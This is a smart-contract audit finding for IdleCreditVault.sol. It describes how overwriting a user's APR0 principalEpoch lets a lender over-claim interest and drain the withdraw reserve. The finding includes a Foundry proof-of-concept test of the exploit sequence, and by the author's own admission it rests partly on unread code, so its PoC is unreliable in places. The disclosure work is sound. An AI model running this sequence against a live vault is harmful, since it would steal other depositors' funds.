### Title
Stale APR0 `principalEpoch` overwrite lets a lender multiply APR0 interest claims and drain the funded withdraw reserve - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
In `IdleCreditVault`, a user's APR=0 withdraw principal is tracked in a single `Apr0UserData` slot (`apr0Users[_user].principal` / `principalEpoch`). When a lender opens a second APR0 withdraw request before claiming the first, `principalEpoch` is overwritten with the newer epoch while `principal` accumulates. At claim time the *entire* accumulated principal is settled against `apr0RateByEpoch[newEpoch]`, whose denominator (`apr0TotalPrincipal`) only contained the second request's principal. The user is paid pro‑rata interest for principal that was never part of that epoch's rate split — an effective arbitrary multiplier on APR0 interest, paid out of the same funded reserve that backs other users' withdraw receipts.

### Finding Description
`requestWithdraw` routes to `_requestWithdrawApr0` when `unscaledApr == 0` and the pool isn't closed [1](#0-0) . The APR0 accounting keeps only one principal slot per user with one `principalEpoch` index [2](#0-1) .

The epoch guard in `requestWithdraw` only blocks a second request when `lossRecoveryPriceByEpoch[lossEpoch] != 0` — i.e. after a realized loss — so a healthy pool lets a user stack two APR0 requests across consecutive buffer periods [3](#0-2) .

The interest rate is stored per epoch as `apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal`, where `_principal` is the *current* `apr0TotalPrincipal`, and the global bucket is then zeroed [4](#0-3) . At settlement, `_settleApr0` applies `apr0RateByEpoch[_reqEpoch]` to the user's whole `principal` — including principal deposited under an earlier `principalEpoch` that was overwritten [5](#0-4) . This mirrors the CVE class: an attacker-chosen sequence overwrites a stale index slot, and the victim's accounting (the funded withdraw reserve) is overwritten/drained outside its intended scope.

### Impact Explanation
Direct theft / insolvency: the attacker's claim pays `(P1+P2) * apr0RateByEpoch[N+1]` while `pendingWithdraws` was only topped up by the true per-epoch net interest computed against `P2` alone. The excess comes from `underlyingToken` held in the strategy, which is the same balance that funds `_claimFundedWithdrawRequest` and `_transferFundedClaim` for all other users [6](#0-5) . With `P1 >> P2` the multiplier is unbounded (e.g., P1 = 10,000× P2 yields ~10,000× the intended epoch interest), limited only by the strategy's funded balance. Other claimants' receipts then revert on insufficient balance — permanent loss for them up to the drained amount.

### Likelihood Explanation
Requires `unscaledApr == 0` (APR0 mode, a supported configuration), a `stopEpoch` with explicit override interest `> 1` so `apr0RateByEpoch` is written [7](#0-6) , and the attacker being a KYC-passing lender able to call `cdoEpoch.requestWithdraw` in two consecutive buffer periods without claiming in between — all honest-manager sequencing, no privileged collusion. The attacker's only cost is depositing tranche principal which is returned anyway.

### Recommendation
In `_requestWithdrawApr0`, either revert if `apr0Users[_user].principal != 0` and `principalEpoch != epochNumber` hasn't been settled (force claim/settlement before re-requesting), or store APR0 principal per epoch (`apr0PrincipalByEpoch[user][epoch]`) and settle each epoch against its own `apr0RateByEpoch`. At minimum, do not overwrite `principalEpoch` while an unsettled principal exists.

### Proof of Concept
Foundry fork sketch against the existing `IdleCreditVault.t.sol` harness (extend `testApr0WithdrawGetsInterestAtStopEpoch`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
import "./IdleCreditVault.t.sol";

contract Apr0StaleEpochPoC is IdleCreditVaultTest {
    function testApr0PrincipalEpochOverwriteOverpays() external {
        _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
        vm.prank(owner);
        cdoEpoch.setIsAYSActive(false);
        vm.prank(manager);
        IdleCreditVault(address(strategy)).setAprs(0, 0); // APR0 mode

        IdleCreditVault cv = IdleCreditVault(address(strategy));
        uint256 amount = 10000 * ONE_SCALE;
        uint256 mintedAA = idleCDO.depositAA(amount); // this contract = attacker LP
        _transferBurnedTrancheTokens(address(this), true);

        // epoch 0
        _startEpochAndCheckPrices(0);
        _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

        // buffer of epoch 1: request with P1 = almost all tranches
        cdoEpoch.requestWithdraw(mintedAA - 1e18, address(AAtranche));
        uint256 p1 = cv.apr0Users(address(this)).principal; // large

        _startEpochAndCheckPrices(1);
        // stopEpoch with explicit override interest so apr0RateByEpoch[1] is written
        uint256 overrideInterest = cdoEpoch.expectedEpochInterest() + 1000e6;
        deal(defaultUnderlying, borrower, overrideInterest + cv.pendingWithdraws());
        vm.prank(borrower); IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), type(uint256).max);
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(0, overrideInterest, cdoEpoch.epochDuration(), 0);

        // buffer of epoch 2: second APR0 request overwrites principalEpoch
        cdoEpoch.requestWithdraw(1e18, address(AAtranche)); // P2 tiny

        _startEpochAndCheckPrices(2);
        // stopEpoch with override: rate[2] denominator only counts P2
        deal(defaultUnderlying, borrower, overrideInterest + cv.pendingWithdraws());
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(0, overrideInterest, cdoEpoch.epochDuration(), 0);

        // claim: settledPrincipal = P1+P2 paid at apr0RateByEpoch[2] (denominator = P2)
        uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
        cdoEpoch.claimWithdrawRequest();
        uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre;

        // intended = P1 + P2 + interest on P1 (epoch1 rate) + interest on P2 (epoch2 rate)
        // actual pays (P1+P2) * rate[2] where rate[2] ≈ netInterest/P2 >> intended
        assertGt(paid, p1 + cv.apr0RateByEpoch(2) * p1 / 1e18, 'over-claim did not occur');
    }
}
```

Caveat: I was unable to read the full body of `_requestWithdrawApr0` and the tail of `_settleApr0` within available iterations; the finding assumes the single-slot `principal`/`principalEpoch` semantics indicated by the field usage in `_clearWithdrawClaimForEpoch` and `_withdrawClaimAmountsForEpoch` [8](#0-7) . If `_requestWithdrawApr0` reverts on existing unsettled principal or buckets principal per epoch internally, the exploit is blocked and this should be downgraded.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L261-271)
```text
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (
      lossRecoveryPrice != 0 &&
      (withdrawsRequestsByEpoch[_user][lossEpoch] != 0 ||
      (apr0Users[_user].principal != 0 && apr0Users[_user].principalEpoch == lossEpoch))
    ) {
      // A loss-adjusted receipt must be claimed before opening a later request, otherwise
      // `lastWithdrawRequest` would stop pointing to the epoch that stores its haircut.
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L285-293)
```text
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L513-528)
```text
    if (_expInterest > 1 && _expInterest > _pendingFees) {
      // Remove already booked withdraw fees from the interest base before splitting.
      uint256 _interestNetOfFees = _expInterest - _pendingFees;
      // Total principal used for the pro-rata split:
      // IdleCDO TVL (which excludes APR0 requested principal) + APR0 principal bucket.
      uint256 _totalPrincipalForSplit = _tvl + _principal;
      if (_totalPrincipalForSplit != 0) {
        // APR0 users get a pro-rata share of realized interest.
        uint256 _apr0InterestGross = _interestNetOfFees * _principal / _totalPrincipalForSplit;
        if (_apr0InterestGross != 0) {
          // Same fee model as normal withdraw interest.
          uint256 _apr0Fee = _apr0InterestGross * _cdo.fee() / FULL_ALLOC;
          _apr0NetInterest = _apr0InterestGross - _apr0Fee;
          _adjPendingWithdrawFees += _apr0Fee;
          _expInterest -= _apr0NetInterest;
        }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L533-541)
```text
    if (_apr0NetInterest != 0) {
      // Funds owed to withdraw requesters increase by APR0 net interest.
      pendingWithdraws += _apr0NetInterest;
      // Save per-epoch net rate; each APR0 request accrues exactly once on its request epoch.
      apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal;
    }
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L545-560)
```text
  function _settleApr0(address _user) internal {
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 _principal = _apr0User.principal;
    if (_principal == 0) {
      return;
    }
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
    // Move principal from "open APR0 bucket" to "settled bucket" (same principal, not duplicated).
    _apr0User.settledPrincipal += _principal;
    uint256 _rate = apr0RateByEpoch[_reqEpoch];
    if (_rate != 0) {
      // Convert per-epoch rate to claimable underlying interest.
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L821-831)
```text
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
```
